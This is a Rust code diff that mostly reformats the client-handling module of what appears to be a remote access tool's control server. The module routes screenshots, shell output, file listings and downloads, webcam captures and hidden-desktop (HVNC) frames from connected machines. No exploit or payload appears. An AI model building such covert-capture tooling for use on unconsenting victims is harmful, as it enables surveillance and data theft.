@@ -4,9 +4,9 @@ use common::packets::*;
 use tokio::sync::mpsc::{self, Receiver, Sender};
 use tokio::sync::oneshot;
 
+use common::packets::ClientboundPacket;
 use rand::SeedableRng;
 use rand_chacha::ChaCha20Rng;
-use common::packets::ClientboundPacket;
 
 pub struct ClientWrapper; // Maybe this shouldn't be a struct?
 
@@ -96,24 +96,16 @@ impl ClientReaderWrapper {
                         self.nonce_generator = Some(ChaCha20Rng::from_seed(seed));
                     }
                     Err(_) => {
-                        self.client_sender
-                            .send(ClientCommand::Close)
-                            .await
-                            .ok(); // it's ok if already closed
+                        self.client_sender.send(ClientCommand::Close).await.ok();
+                        // it's ok if already closed
                     }
                 }
             }
             Ok(_) => {
-                self.client_sender
-                    .send(ClientCommand::Close)
-                    .await
-                    .ok(); // it's ok if already closed
+                self.client_sender.send(ClientCommand::Close).await.ok(); // it's ok if already closed
             }
             Err(_) => {
-                self.client_sender
-                    .send(ClientCommand::Close)
-                    .await
-                    .ok(); // it's ok if already closed
+                self.client_sender.send(ClientCommand::Close).await.ok(); // it's ok if already closed
             }
         };
     }
@@ -129,54 +121,69 @@ impl ClientReaderWrapper {
         use ServerboundPacket::*;
         match packet {
             EncryptionRequest => self.handle_encryption_request().await,
-            
+
             ClientInfo(info) => {
-                self.send_server_packet(ServerCommand::RegisterClient(self.client_sender.clone(), self.addr, info)).await;
-            },
-            
+                self.send_server_packet(ServerCommand::RegisterClient(
+                    self.client_sender.clone(),
+                    self.addr,
+                    info,
+                ))
+                .await;
+            }
+
             ScreenshotResult(screenshot_data) => {
-                self.send_server_packet(ServerCommand::ScreenshotData(self.addr, screenshot_data)).await;
-            },
+                self.send_server_packet(ServerCommand::ScreenshotData(self.addr, screenshot_data))
+                    .await;
+            }
 
             RemoteDesktopFrame(frame) => {
-                self.send_server_packet(ServerCommand::RemoteDesktopFrame(self.addr, frame)).await;
-            },
+                self.send_server_packet(ServerCommand::RemoteDesktopFrame(self.addr, frame))
+                    .await;
+            }
 
             ShellOutput(output) => {
-                self.send_server_packet(ServerCommand::ShellOutput(self.addr, output)).await;
-            },
+                self.send_server_packet(ServerCommand::ShellOutput(self.addr, output))
+                    .await;
+            }
 
             ProcessList(process_list) => {
-                self.send_server_packet(ServerCommand::ProcessList(self.addr, process_list)).await;
-            },
+                self.send_server_packet(ServerCommand::ProcessList(self.addr, process_list))
+                    .await;
+            }
 
             DisksResult(disks) => {
-                self.send_server_packet(ServerCommand::DisksResult(self.addr, disks)).await;
-            },
+                self.send_server_packet(ServerCommand::DisksResult(self.addr, disks))
+                    .await;
+            }
 
             FileList(files) => {
-                self.send_server_packet(ServerCommand::FileList(self.addr, files)).await;
-            },
+                self.send_server_packet(ServerCommand::FileList(self.addr, files))
+                    .await;
+            }
 
             CurrentFolder(path) => {
-                self.send_server_packet(ServerCommand::CurrentFolder(self.addr, path)).await;
-            },
+                self.send_server_packet(ServerCommand::CurrentFolder(self.addr, path))
+                    .await;
+            }
 
             DonwloadFileResult(file_data) => {
-                self.send_server_packet(ServerCommand::DownloadFileResult(self.addr, file_data)).await;
-            },
-            
+                self.send_server_packet(ServerCommand::DownloadFileResult(self.addr, file_data))
+                    .await;
+            }
+
             WebcamResult(webcam_data) => {
-                self.send_server_packet(ServerCommand::WebcamResult(self.addr, webcam_data)).await;
-            },
-            
+                self.send_server_packet(ServerCommand::WebcamResult(self.addr, webcam_data))
+                    .await;
+            }
+
             HVNCFrame(frame_data) => {
-                self.send_server_packet(ServerCommand::HVNCFrame(self.addr, frame_data)).await;
-            },
-            
+                self.send_server_packet(ServerCommand::HVNCFrame(self.addr, frame_data))
+                    .await;
+            }
+
             EncryptionConfirm(_, _) => {
                 println!("Received unexpected EncryptionConfirm packet");
-            },
+            }
 
             #[allow(unreachable_patterns)]
             _ => {
@@ -192,21 +199,20 @@ impl ClientReaderWrapper {
                 .read_packet(&self.secret, self.nonce_generator.as_mut())
                 .await
             {
-                Ok(p) => {
-                    match &p {
-                        Some(packet) => {
-                            self.handle_packet(packet.clone()).await;
-                        },
-                        None => println!("Got None packet from {}", self.addr),
+                Ok(p) => match &p {
+                    Some(packet) => {
+                        self.handle_packet(packet.clone()).await;
                     }
-
-                }
+                    None => println!("Got None packet from {}", self.addr),
+                },
                 Err(e) => {
                     println!("Error reading from client {}: {:?}", self.addr, e);
                     if e == "Connection reset by peer" {
-                        self.send_server_packet(ServerCommand::ClientDisconnected(self.addr)).await;
+                        self.send_server_packet(ServerCommand::ClientDisconnected(self.addr))
+                            .await;
                     } else {
-                        self.send_server_packet(ServerCommand::ClientDisconnected(self.addr)).await;
+                        self.send_server_packet(ServerCommand::ClientDisconnected(self.addr))
+                            .await;
                     }
                     break;
                 }
@@ -254,11 +260,10 @@ impl ClientWriterWrapper {
                             break;
                         }
 
-                        self
-                        .writer
-                        .write_packet(p, &self.secret, self.nonce_generator.as_mut())
-                        .await
-                        .unwrap_or_else(|e| println!("Error writing packet: {}", e))
+                        self.writer
+                            .write_packet(p, &self.secret, self.nonce_generator.as_mut())
+                            .await
+                            .unwrap_or_else(|e| println!("Error writing packet: {}", e))
                     }
                 }
             }
